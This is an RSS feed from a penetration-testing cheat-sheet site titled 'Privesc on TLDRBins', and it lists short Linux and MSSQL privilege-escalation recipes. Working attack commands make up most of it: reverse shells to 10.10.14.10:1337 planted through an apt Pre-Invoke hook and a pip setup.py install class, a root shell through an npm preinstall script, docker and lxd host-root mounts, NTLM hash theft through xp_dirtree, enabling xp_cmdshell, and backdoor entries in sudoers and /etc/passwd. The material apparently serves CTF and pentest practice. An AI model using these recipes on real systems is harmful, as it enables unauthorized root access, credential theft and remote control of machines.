channel.title: Privesc on TLDRBins
channel.description: Recent content in Privesc on TLDRBins

item.title: Apt
item.description: Privesc Abuse apt update # Create a malicious config echo 'APT::Update::Pre-Invoke {"bash -c '\''bash -i >& /dev/tcp/10.10.14.10/1337 0>&1'\''"}' > /etc/apt/apt.conf.d/evil # Exploit sudo apt update -y

item.title: Docker
item.description: Privesc Abuse docker group # List images docker images # Mount host root filesystem docker run -v /:/mnt -it image_name bash # Check ls /mnt/root

item.title: lxd
item.description: Basic Commands # Check if user in lxd group id # List containers lxc list # List images lxc image list Privesc / Container Escape # Upload a 656 bytes conatiner image echo  | base64 -d > test.tar.bz2 # Import image lxc image import test.tar.bz2 --alias testImage # Check image lxc image list # Init VM lxc init testImage testVM -c security.privileged=true # Mount the host / lxc config device add testVM realRoot disk source=/ path=r # Start VM lxc start testVM # Check containers lxc list # Execute as root inside container lxc exec testVM -- /bin/bash # We have full access on host disk thru /r/ ls -la /r/root Build image for other arch git clone git clone https://github.

item.title: Metasploit
item.description: Metasploit Start Metasploit msfconsole -q Basic Commands # Return to previous page back # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter

item.title: MSSQL Linked Servers
item.description: Linked Servers Basic Commands Hint: Use double '' to escape ' in mssql # Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE ('select @@version;') at [DOMAIN\LINKED_SERVER]; # Execute query from linked server to current server EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [DOMAIN\CURRENT_SERVER]') at [DOMAIN\LINKED_SERVER]; Privilege Escalation Create Admin User from Privilege Linked Server EXECUTE('EXECUTE(''CREATE LOGIN test WITH PASSWORD = ''''Test1234!

item.title: MSSQL Privilege Escalation
item.description: Steal NTLM hash # In our local Linux machine sudo responder -I tun0 # Inside mssql terminal xp_dirtree '\\10.10.14.10\any\thing'; # Or use master; exec xp_dirtree '\\10.10.14.10\any\thing'; Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Impersonate sa to run xp_cmdshell execute as login = 'sa'; exec sp_configure 'show advanced options', 1; execute as login = 'sa'; reconfigure; execute as login = 'sa'; exec sp_configure 'xp_cmdshell', 1; execute as login = 'sa'; reconfigure; execute as login = 'sa'; EXEC master.

item.title: npm
item.description: npm Privilege Escalation Create a package.json { "name": "root", "version": "1.0.0", "scripts": { "preinstall": "/bin/bash" } } mkdir test mv package.json test/ sudo npm i test/ --unsafe

item.title: pip
item.description: Privesc #!/usr/bin/env python3 from setuptools import setup from setuptools.command.install import install import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect(("10.10.14.10",1337)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call(["/bin/sh", "-i"]) setup( cmdclass={ "install": Exploit } ) # Run sudo pip install .

item.title: sudoers
item.description: Privesc Abuse /etc/sudoers # IF you have control over `/etc/sudoers` chmod 666 /etc/sudoers echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers chmod 440 /etc/sudoers

item.title: Writable /etc/passwd
item.description: Writable /etc/passwd # Check ls -l /etc/passwd /etc/shadow # Create password hash openssl passwd -1 password # Add to /etc/passwd echo 'user:$1$mQ8Xk.u8$XjFlyg01xLRjhCK/v//Qe/:0:0:comment:/root:/bin/bash' >> /etc/passwd # Get root shell su - user
